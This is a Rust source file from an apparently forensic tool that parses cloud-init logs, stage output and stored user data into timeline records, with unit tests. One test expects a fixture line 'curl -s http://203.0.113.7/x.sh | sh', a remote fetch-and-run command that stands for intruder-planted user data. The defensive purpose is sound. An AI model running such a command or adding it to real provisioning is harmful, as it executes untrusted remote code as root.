//! cloud-init: what configured the machine at first boot.
//!
//! - `cloud-init.log`: Python logging, `2024-03-10 01:02:03,123 - util.py[DEBUG]: message`. The
//!   time is the machine's local time with no zone (some versions write a UTC offset, which is
//!   then recorded as written); tracebacks continue the entry before them.
//! - `cloud-init-output.log`: the stdout and stderr of the stages and of user scripts. It has
//!   no times, except the `Cloud-init v. X running 'init' at Wed, 04 Feb 2026 18:43:27 +0000.`
//!   line that opens each stage.
//! - the user data, vendor data and scripts cloud-init stored for the instance. Whatever a
//!   cloud or an intruder put there ran as root at first boot (and `scripts/per-boot` at every
//!   boot), so every non-empty line is a record.
//!
//! Format reference: cloud-init documentation, "Logs" and "Instance data"; the file layout is
//! `/var/lib/cloud` as described under "Boot stages".

use crate::common::stamped_log::{parse, timestamp, Parsed};
use crate::text::{for_each_line, lossy};
use crate::{Artifact, Category, Input, LINUX};
use nixcavate_core::time::{month_from_abbrev, parse_iso8601, parse_uint, secs_from_civil};
use nixcavate_core::{Basis, Error, Event, Loc, Record, Result, Sink, Timestamp};
use serde::Serialize;

pub const LOG: Artifact = Artifact::new(
    "cloud-init-log",
    "cloud-init log",
    Category::Logs,
    LINUX,
    &["var/log/cloud-init.log*", "var/log/installer/cloud-init.log*"],
    |input, sink| parse(input, sink, "a cloud-init log", "cloud_init", log_line),
);

pub const OUTPUT: Artifact = Artifact::new(
    "cloud-init-output",
    "cloud-init stage and user script output",
    Category::Logs,
    LINUX,
    &["var/log/cloud-init-output.log*"],
    parse_output,
);

pub const USER_DATA: Artifact = Artifact::new(
    "cloud-init-user-data",
    "cloud-init user data, vendor data and scripts",
    Category::Persistence,
    LINUX,
    &[
        "var/lib/cloud/instances/*/user-data.txt",
        "var/lib/cloud/instances/*/vendor-data.txt",
        "var/lib/cloud/instances/*/vendor-data2.txt",
        "var/lib/cloud/instances/*/cloud-config.txt",
        "var/lib/cloud/instances/*/vendor-cloud-config.txt",
        "var/lib/cloud/instances/*/scripts/*",
        "var/lib/cloud/scripts/*/*",
        "var/lib/cloud/seed/*/user-data",
        "var/lib/cloud/seed/*/vendor-data",
        "var/lib/cloud/seed/*/*/user-data",
        "var/lib/cloud/seed/*/*/vendor-data",
    ],
    parse_user_data,
);

/// `2024-03-10 01:02:03,123 - util.py[DEBUG]: message`
fn log_line<'a>(input: &Input, line: &'a str) -> Option<Parsed<'a>> {
    let (time, used) = parse_iso8601(line.as_bytes())?;
    let rest = line.get(used..)?.strip_prefix(" - ")?;
    let (source, rest) = rest.split_once('[')?;
    let (level, message) = rest.split_once("]: ")?;
    Some(Parsed {
        time: Some(timestamp(input, &time)),
        level: Some(level),
        source: Some(source),
        pid: None,
        message,
        timeline: level != "DEBUG",
    })
}

#[derive(Serialize)]
struct Output<'a> {
    /// Only on the line that opens a stage, which carries the time in UTC.
    time: Option<Timestamp>,
    message: &'a str,
}

impl Record for Output<'_> {
    fn events(&self) -> impl Iterator<Item = Event<'_>> {
        self.time.map(|t| Event::new(t, "cloud_init", self.message)).into_iter()
    }
}

/// The time in `Cloud-init v. 25.3 running 'init' at Wed, 04 Feb 2026 18:43:27 +0000. Up 7.23 seconds.`
fn stage_time(line: &str) -> Option<Timestamp> {
    let (head, tail) = line.split_once(" running '")?;
    head.starts_with("Cloud-init v.").then_some(())?;
    let at = tail.split_once("' at ")?.1;
    // `Wed, 04 Feb 2026 18:43:27 +0000. Up ...`
    let mut words = at.split_whitespace();
    let (_weekday, day, month, year, clock, zone) =
        (words.next()?, words.next()?, words.next()?, words.next()?, words.next()?, words.next()?);
    let number = |text: &str| parse_uint(text.as_bytes()).and_then(|v| u32::try_from(v).ok());
    let mut hms = clock.split(':');
    let secs = secs_from_civil(
        number(year)?.into(),
        month_from_abbrev(month.as_bytes())?,
        number(day)?,
        number(hms.next()?)?,
        number(hms.next()?)?,
        number(hms.next()?)?,
    )?;
    let zone = zone.trim_end_matches('.');
    let (sign, digits) = (zone.get(..1)?, zone.get(1..)?);
    let east = i64::from(number(digits.get(..2)?)?) * 3600 + i64::from(number(digits.get(2..4)?)?) * 60;
    let east = if sign == "-" { -east } else { east };
    (sign == "+" || sign == "-").then(|| Timestamp::from_secs(secs - east, Basis::Recorded))
}

fn parse_output(input: &Input, sink: &mut Sink) -> Result<()> {
    let mut seen = false;
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let text = text.trim_end();
        if text.trim().is_empty() {
            return Ok(());
        }
        seen = true;
        sink.emit(Loc::Line(line.number), &Output { time: stage_time(text), message: text })
    })?;
    if seen {
        Ok(())
    } else {
        Err(Error::skipped("empty file"))
    }
}

#[derive(Serialize)]
struct Line<'a> {
    /// `user-data`, `vendor-data`, `cloud-config` or `script`.
    kind: &'static str,
    text: &'a str,
}

impl Record for Line<'_> {}

fn parse_user_data(input: &Input, sink: &mut Sink) -> Result<()> {
    let name = input.path.rsplit('/').next().unwrap_or_default();
    let kind = if input.path.contains("/scripts/") {
        "script"
    } else if name.starts_with("vendor-data") || name.starts_with("vendor-cloud-config") {
        "vendor-data"
    } else if name.starts_with("cloud-config") {
        "cloud-config"
    } else {
        "user-data"
    };
    let mut seen = false;
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let text = text.trim_end();
        if text.trim().is_empty() {
            return Ok(());
        }
        seen = true;
        sink.emit(Loc::Line(line.number), &Line { kind, text })
    })?;
    if seen {
        Ok(())
    } else {
        Err(Error::skipped("empty file"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::{fixture, run};

    fn non_blank(data: &[u8]) -> usize {
        data.split(|&b| b == b'\n').filter(|l| !l.iter().all(u8::is_ascii_whitespace)).count()
    }

    fn records(out: &str) -> usize {
        out.lines().take_while(|l| !l.starts_with("---")).count()
    }

    #[test]
    fn log_has_an_assumed_zone_and_keeps_tracebacks() {
        let data = fixture("applogs/cloud-init/cloud-init.log");
        let out = run(&LOG, "var/log/cloud-init.log", &data, 0);
        assert_eq!(records(&out), non_blank(&data));
        assert!(!out.contains("--- warning") && !out.contains("--- failed"), "{out}");
        assert!(
            out.contains("\"time\":\"2026-11-12T22:57:21.116Z\",\"level\":\"DEBUG\",\"source\":\"log_util.py\""),
            "{out}"
        );
        // The traceback lines have no time of their own.
        assert!(
            out.contains("\"time\":null,\"level\":null,\"source\":null,\"pid\":null,\"message\":\"Traceback"),
            "{out}"
        );
        // DEBUG is most of the file and stays out of the timeline.
        let events = out.split("--- timeline ---").nth(1).map_or(0, |t| t.lines().count());
        assert!(events > 0 && events < out.matches("\"level\":\"DEBUG\"").count(), "{events}");
    }

    #[test]
    fn log_snapshot_of_the_first_entries() {
        let data = fixture("applogs/cloud-init/cloud-init.log");
        let head: Vec<u8> = data.split_inclusive(|&b| b == b'\n').take(12).flatten().copied().collect();
        insta::assert_snapshot!(run(&LOG, "var/log/cloud-init.log", &head, 0));
    }

    #[test]
    fn a_utc_offset_makes_the_time_recorded() {
        let out = run(&LOG, "var/log/cloud-init.log", b"2024-03-10 01:02:03,123+0100 - util.py[INFO]: x\n", 0);
        assert!(out.contains("\"time\":\"2024-03-10T00:02:03.123Z\""), "{out}");
    }

    #[test]
    fn output_stage_lines_carry_a_time() {
        let data = fixture("applogs/cloud-init/cloud-init-output.log");
        let out = run(&OUTPUT, "var/log/cloud-init-output.log", &data, 0);
        assert_eq!(records(&out), non_blank(&data));
        assert!(out.contains("\"time\":\"2026-11-12T22:57:21Z\""), "{out}");
        assert!(out.contains("\"time\":null,\"message\":\"ci-info:"), "{out}");
        insta::assert_snapshot!(out);
    }

    #[test]
    fn stage_time_uses_the_written_offset() {
        let at = stage_time("Cloud-init v. 25.3 running 'init' at Wed, 04 Feb 2026 18:43:27 -0500. Up 7.23 seconds.");
        assert_eq!(at.map(|t| t.to_rfc3339()).as_deref(), Some("2026-02-04T23:43:27Z"));
        assert!(stage_time("Cloud-init v. 25.3 running 'init' at nonsense").is_none());
        assert!(stage_time("not a stage line").is_none());
    }

    #[test]
    fn user_data_every_non_empty_line() {
        let data = fixture("applogs/cloud-init/user-data.txt");
        let path = "var/lib/cloud/instances/iid-1/user-data.txt";
        let out = run(&USER_DATA, path, &data, 0);
        assert_eq!(records(&out), non_blank(&data));
        assert!(
            out.contains("\"kind\":\"user-data\"") && out.contains("curl -s http://203.0.113.7/x.sh | sh"),
            "{out}"
        );
        insta::assert_snapshot!(out);
        assert!(run(&USER_DATA, "var/lib/cloud/instances/iid-1/vendor-data.txt", b"", 0).contains("skipped"));
        let script = run(&USER_DATA, "var/lib/cloud/scripts/per-boot/50-x", b"#!/bin/sh\nid\n", 0);
        assert!(script.contains("\"kind\":\"script\""), "{script}");
    }

    #[test]
    fn user_data_paths_cover_instances_seeds_and_scripts() {
        use nixcavate_source::glob::Pattern;
        let matches = |path: &str| USER_DATA.paths.iter().any(|p| Pattern::new(p).matches(path));
        assert!(matches("var/lib/cloud/instances/i-0abc/user-data.txt"));
        assert!(matches("var/lib/cloud/instances/i-0abc/scripts/part-001"));
        assert!(matches("var/lib/cloud/scripts/per-once/x.sh"));
        assert!(matches("var/lib/cloud/seed/nocloud/user-data"));
        assert!(matches("var/lib/cloud/seed/nocloud-net/user-data"));
        assert!(!matches("var/lib/cloud/instances/i-0abc/obj.pkl"));
    }

    #[test]
    fn other_text_is_not_a_cloud_init_log() {
        assert!(run(&LOG, "var/log/cloud-init.log", b"hello\n", 0).contains("not a cloud-init log"));
        assert!(run(&LOG, "var/log/cloud-init.log", b"", 0).contains("skipped"));
        let hostile: [&[u8]; 4] =
            [b"2024-03-10 01:02:03,123 - [", b"2024-03-10 01:02:03,123 - a[b", b"Cloud-init v. running ' at ", b"\xff"];
        for data in hostile {
            run(&LOG, "var/log/cloud-init.log", data, 0);
            run(&OUTPUT, "var/log/cloud-init-output.log", data, 0);
            run(&USER_DATA, "var/lib/cloud/instances/i/user-data.txt", data, 0);
        }
    }
}
